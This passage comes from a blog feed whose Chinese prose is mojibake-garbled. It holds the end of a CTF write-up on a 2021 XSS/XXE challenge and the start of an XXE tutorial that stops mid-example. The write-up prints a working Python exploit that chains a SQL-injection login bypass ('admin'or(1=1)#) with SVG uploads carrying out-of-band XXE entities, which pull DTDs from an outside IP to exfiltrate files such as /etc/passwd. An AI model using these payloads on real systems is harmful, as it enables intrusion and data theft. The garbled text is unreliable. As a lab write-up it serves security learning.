Workeræ˜¯æµè§ˆå™¨åœ¨åå°è¿è¡Œçš„è„šæœ¬ï¼Œä¸webé¡µé¢åˆ†ç¦»ï¼Œä»¥æ›´å¥½åœ°æ”¯æŒä¸éœ€è¦webé¡µé¢æˆ–ç”¨æˆ·äº¤äº’çš„åŠŸèƒ½ã€‚ä¹Ÿå¯ä»¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªä»‹äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ï¼Œæ‹¥æœ‰<strong>æ‹¦æˆªè¯·æ±‚ã€ä¿®æ”¹è¿”å›å†…å®¹</strong>çš„æƒåŠ›ã€‚å¯ä»¥ç”¨æ¥ç¼“å­˜å¹¶å¤„ç†ç¦»çº¿ç½‘é¡µï¼ˆç”¨æ¥XSSï¼‰ã€‚</li><li>Service Workers è¦æ±‚<strong>å¿…é¡»åœ¨ HTTPS ä¸‹æ‰èƒ½è¿è¡Œ</strong>ã€‚ä¸ºäº†ä¾¿äºæœ¬åœ°å¼€å‘ï¼Œ<strong>localhost</strong> ä¹Ÿè¢«æµè§ˆå™¨è®¤ä¸ºæ˜¯å®‰å…¨æºã€‚</li><li>Service Workers<strong>æ²¡æœ‰è®¿é—® DOM çš„èƒ½åŠ›</strong>ã€‚</li></ul><p>å‰©ä¸‹çš„æ”¾å¼ å›¾ï¼Œå±å®å¯¹xssè¿™ä¸€å¿«è¿˜ä¸å¤ªä¼š</p><p><img src="https://img-blog.csdnimg.cn/0c542dea2e5240bd9a145042b677df13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h2><p>è¿™æ˜¯å€Ÿé‰´å¤©æ¢çš„è§£æ³•</p><p>ç›´æ¥æ‹¿expå§ï¼Œä¸­é—´æœ‰æˆ‘å¾ˆå¤šå°è¯•çš„svg</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span>  re<br><span class="hljs-keyword">import</span>  base64<br>url = <span class="hljs-string">&#x27;http://7f02f7e5-c929-4078-9f06-5e6c4acea6db.node4.buuoj.cn/&#x27;</span><br>svg = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY[</span><br><span class="hljs-string">&lt;!ENTITY % secret SYSTEM &quot;http://39.107.239.30:80/1.php&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % visit_hacker SYSTEM &quot;http://39.107.239.30:80/xxe2.xml&quot;&gt;</span><br><span class="hljs-string">%visit_hacker;</span><br><span class="hljs-string">%hacker;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;hacker&gt;&amp;sending;&lt;/hacker&gt;&quot;&quot;&quot;</span><br>svg2 = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE message [</span><br><span class="hljs-string">    &lt;!ENTITY % remote SYSTEM &quot;http://39.107.239.30:80/dtd&quot;&gt;  </span><br><span class="hljs-string">    %remote;</span><br><span class="hljs-string">    %start;</span><br><span class="hljs-string">    %send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="hljs-string">&lt;/svg&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># b&quot;&quot;&quot;&lt;!-- test.jpg --&gt;</span><br><span class="hljs-comment"># &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="hljs-comment"># &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="hljs-comment"># &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="hljs-comment"># &lt;html&gt;</span><br><span class="hljs-comment"># &lt;head&gt;&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;&lt;/head&gt;</span><br><span class="hljs-comment"># &lt;body&gt;</span><br><span class="hljs-comment"># &lt;svg style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1);&quot;&gt;&lt;/svg&gt;</span><br><span class="hljs-comment"># &lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-comment"># &lt;/xsl:template&gt;</span><br><span class="hljs-comment"># &lt;/xsl:stylesheet&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br>svg3 = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE svg [</span><br><span class="hljs-string">&lt;!ELEMENT svg ANY &gt;</span><br><span class="hljs-string">&lt;!ENTITY % sp SYSTEM &quot;http://39.107.239.30:80/xxe.xml&quot;&gt;</span><br><span class="hljs-string">%sp;</span><br><span class="hljs-string">%param1;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg viewBox=&quot;0 0 200 200&quot; version=&quot;1.2&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; style=&quot;fill:red&quot;&gt;</span><br><span class="hljs-string">      &lt;text x=&quot;15&quot; y=&quot;100&quot; style=&quot;fill:black&quot;&gt;XXE via SVG rasterization&lt;/text&gt;</span><br><span class="hljs-string">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; rx=&quot;10&quot; ry=&quot;10&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:pink;opacity:0.7&quot;/&gt;</span><br><span class="hljs-string">      &lt;flowRoot font-size=&quot;15&quot;&gt;</span><br><span class="hljs-string">         &lt;flowRegion&gt;</span><br><span class="hljs-string">           &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:red;opacity:0.3&quot;/&gt;</span><br><span class="hljs-string">         &lt;/flowRegion&gt;</span><br><span class="hljs-string">         &lt;flowDiv&gt;</span><br><span class="hljs-string">            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;</span><br><span class="hljs-string">         &lt;/flowDiv&gt;</span><br><span class="hljs-string">      &lt;/flowRoot&gt;</span><br><span class="hljs-string">&lt;/svg&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s = requests.Session()<br>s.cookies[<span class="hljs-string">&quot;PHPSESSID&quot;</span>]= <span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span><br>res = s.post(url+<span class="hljs-string">&#x27;login/login.php&#x27;</span>,<br>             data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27;or(1=1)#&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<br>             headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><br>res2 = s.post(url=url+<span class="hljs-string">&#x27;user/upload.php&#x27;</span>,<br>              data=&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg2)&#125;,<br>              cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res2.text)<br><span class="hljs-built_in">print</span>(base64.b64encode(svg))<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res2.text:<br>    exit(<span class="hljs-number">1</span>)<br>res3 = s.get(url=url+<span class="hljs-string">&#x27;user/&#x27;</span>,cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-comment"># print(res3.text)</span><br><br>u = re.findall(<span class="hljs-string">r&#x27;&lt;embed id=&quot;prebox&quot; src=&quot;\/upload\/([0-9a-zA-z]+)&quot;&#x27;</span>,res3.text)<br>u = <span class="hljs-string">&quot;upload/&quot;</span>+u[<span class="hljs-number">0</span>]<br><br>res4 = s.get(url=url+u).text<br><span class="hljs-built_in">print</span>(res4)<br><br><br><br><br><br></code></pre></div></td></tr></table></figure><p>åé¢æ”¹äº†ä¸€ä¸‹è„šæœ¬ç«Ÿç„¶æ‹¿åˆ°äº†ï¼ŒçœŸæ˜¯å¤ªä¸å®¹æ˜“äº†ï¼Œæ‰å‘ç°å¥½åƒä¸ä¸€å®šæ˜¯éè¦<code>sucesss</code>æ‰è¡Œã€‚</p><p><img src="https://img-blog.csdnimg.cn/4e93e126baa046e091b1f44aa092420a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;script &gt;<br><span class="hljs-built_in">document</span>.domain=<span class="hljs-string">&quot;cubestone.com&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pageload</span>(<span class="hljs-params">data</span>)</span>&#123;<br>    <span class="hljs-built_in">document</span>.body.innerText=data;<br>&#125;<br>fetch(<span class="hljs-string">`loader.php?callback=pageload&amp;secret=cube`</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<span class="hljs-keyword">return</span> res.text();&#125;).then(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<span class="hljs-built_in">eval</span>(data);&#125;)&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>æ‹¿åˆ°<code>upload.php</code>æºç </p><p><img src="https://img-blog.csdnimg.cn/153fad9a5b104fbe97463dc162a71b5b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ç€åˆè¯•äº†ä¸‹å¤©æ¢çš„é‚£ä¸ªæ–¹æ³•ï¼Œé€šäº†ï¼Œå¤ªç—›è‹¦äº†å‘œå‘œå‘œï¼Œæ˜¯æˆ‘xmlä¸­çš„dtdä¸­æœ‰ä¸ªåœ°æ–¹å¤šå†™äº†ä¸ª<code>/</code>ï¼Œå•Šè¿™é¢˜çœ‹äº†ä¸¤å¤©å¤ªç—›è‹¦äº†ã€‚</p><p>è¯»åˆ°äº†<code>/etc/passwd</code></p><p><img src="https://img-blog.csdnimg.cn/0641ecd64f854cd5a2a416bd2bc10752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆ°è¿™å°±å®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–äº†~~</p><p><img src="https://img-blog.csdnimg.cn/91ab5f2234bf4317bf61d64f06e0c848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>flag&#123;632e6e01-d5aa-400a-9f91-bc3c4856fc96&#125;</code>ã€‚</p><p>ç»ˆäºåšå‡ºæ¥äº†ï¼Œè¿™ä¸¤å¤©å­¦xxeä¹Ÿå­¦åˆ°äº†å¾ˆå¤šï¼Œè™½ç„¶æœ‰ä¸ªå°é”™è¯¯æµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´ï¼Œä½†æ‰¾é”™è¯¯çš„è¿‡ç¨‹ä¹Ÿå­¦äº†å¾ˆå¤šï¼Œè¿™ä¸ªæš‘å‡æŠŠXSSçš„çŸ¥è¯†å¾—å¥½å¥½å­¦å­¦ï¼Œè¿˜æœ‰JSçš„ä»£ç ä¹Ÿå¾—è®¤çœŸå­¦å­¦äº†ï¼Œè¥¿æ¹–è®ºå‰‘çš„é‚£ä¸ªæ–¹æ³•è¿˜æ²¡å’‹çœ‹æ‡‚ï¼Œå†å­¦å­¦jså†çœ‹ã€‚</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html">https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html</a></p><p><a href="https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/">https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/</a></p><p><a href="https://www.icystal.top/ctf15-qwb2021harderxss/">https://www.icystal.top/ctf15-qwb2021harderxss/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XXEå­¦ä¹ "><a href="#XXEå­¦ä¹ " class="headerlink" title="XXEå­¦ä¹ "></a>XXEå­¦ä¹ </h1><h3 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a>XMLåŸºç¡€</h3><h4 id="XMLç»“æ„"><a href="#XMLç»“æ„" class="headerlink" title="XMLç»“æ„"></a>XMLç»“æ„</h4><p>XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </p><p>ç¬¬ä¸€è¡ŒXMLçš„å£°æ˜ï¼Œç¬¬äºŒè¡Œ<note> ä¸ºæ ¹å…ƒç´ ï¼Œ ä¸‹é¢çš„to, from,headingå’Œbody éƒ½æ˜¯å­å…ƒç´ </p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  //XMLå£°æ˜<br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>  //æ–‡æ¡£ç±»å‹å®šä¹‰<br>    <br>//æ–‡æ¡£å…ƒç´ <br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h4><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTD æœ‰ä¸¤ç§å£°æ˜çš„æ–¹æ³•ï¼Œä¸€ç§æ˜¯å†…éƒ¨å£°æ˜ï¼Œä¸€ç§æ˜¯å¤–éƒ¨å£°æ˜ï¼Œæˆ‘ä»¬ä¸‹é¢å¼€å…·ä½“çœ‹ä¸€ä¸‹ï¼š</p><p>DTDçš„å†…éƒ¨å£°æ˜ï¼šæ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;ï¼š </p><p>ä¾‹å¦‚<!DOCTYOE test any></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>å¤–éƒ¨å£°æ˜ æ ¹å…ƒç´  SYSTEM â€œæ–‡ä»¶åâ€&gt; æˆ– æ ¹å…ƒç´  PUBLIC â€œpublic_IDâ€ â€œæ–‡ä»¶åâ€&gt; </p><p>ä¾‹å¦‚<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;note.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>George<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h4 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h4><p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“<br>1ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:<br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“å<br>2ï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š<br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“å</p><p>å†…éƒ¨å®ä½“å£°æ˜: ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>å¼•ç”¨å¤–éƒ¨å®ä½“ï¼š</p><p><code>å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code>æˆ–è€…<code>å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="ä»€ä¹ˆæ˜¯XXE"><a href="#ä»€ä¹ˆæ˜¯XXE" class="headerlink" title="ä»€ä¹ˆæ˜¯XXE"></a>ä»€ä¹ˆæ˜¯XXE</h3><p>ç®€å•æ¥è¯´ï¼ŒXXEå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ¢æµ‹ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœä½ å½“å‰ä½¿ç”¨çš„ç¨‹åºä¸ºPHPï¼Œåˆ™å¯ä»¥å°†libxml_disable_entity_loaderè®¾ç½®ä¸ºTRUEæ¥ç¦ç”¨å¤–éƒ¨å®ä½“ï¼Œä»è€Œèµ·åˆ°é˜²å¾¡çš„ç›®çš„ã€‚</p><h3 id="åŸºæœ¬åˆ©ç”¨"><a href="#åŸºæœ¬åˆ©ç”¨" class="headerlink" title="åŸºæœ¬åˆ©ç”¨"></a>åŸºæœ¬åˆ©ç”¨</h3><h4 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥</h4><p>é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜:</p><figure class="highlight xml"><table><tr><td 